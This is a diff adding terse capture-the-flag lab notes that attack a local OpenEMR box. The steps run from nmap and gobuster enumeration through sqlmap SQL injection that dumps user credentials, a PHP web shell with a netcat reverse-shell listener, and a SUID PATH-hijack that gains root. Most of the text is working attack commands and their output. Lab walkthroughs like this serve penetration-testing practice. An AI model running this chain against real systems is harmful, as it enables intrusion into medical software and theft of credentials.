@@ -1,0 +1,45 @@
+1)nmap -A -sS -T4 -p- 192.168.225.137
+21 - ProFTPD 1.3.3d
+80 - http
+
+2)gobuster -w /root/Downloads/common.txt -x zip,php,txt,html,bac,mp4,docx,doc,sh,bak -e -u dir http://192.168.225.137/
+/openemr
+
+3)exploit https://www.exploit-db.com/exploits/49742 sqlinjection
+sqlmap -u "http://192.168.225.137/openemr/interface/login/validateUser.php?u=admin" --threads 10 --level 5 --risk 3 --batch --dbs
+openemr
+
+    sqlmap -u "http://192.168.225.137/openemr/interface/login/validateUser.php?u=admin" --threads 10 --level 5 --risk 3 --batch -D openemr --tables
+        users
+
+    sqlmap -u "http://192.168.225.137/openemr/interface/login/validateUser.php?u=admin" --threads 10 --level 5 --risk 3 --batch -D openemr -T users --dump
+        admin:ackbar
+        medical:medical
+
+4)administration>files>congig.php
+change to shell.php
+
+5)exploit
+<on_your_machine>rlwrap nc -nlvp 1234
+<browser> http://192.168.225.137/openemr/interface/main/main_screen.php?auth=login&site=default
+
+6)su medical
+medical:medical
+
+7)find / -user root -perm -4000 -print 2>/dev/null
+/usr/bin/healthcheck
+
+strings /usr/bin/healthcheck
+clear ; echo 'System Health Check' ; echo '' ; echo 'Scanning System' ; sleep 2 ; ifconfig ; fdisk -l ; du -h
+
+8. Privilege Escalation Using PATH Variable
+   cd /tmp
+   echo '/bin/sh'> ifconfig
+   chmod 777 ifconfig
+   export PATH=/tmp:$PATH
+
+./usr/bin/healthcheck
+
+    we are root now!!!
+    cat /root/root.txt
+        root hash: eaff25eaa9ffc8b62e3dfebf70e83a7b
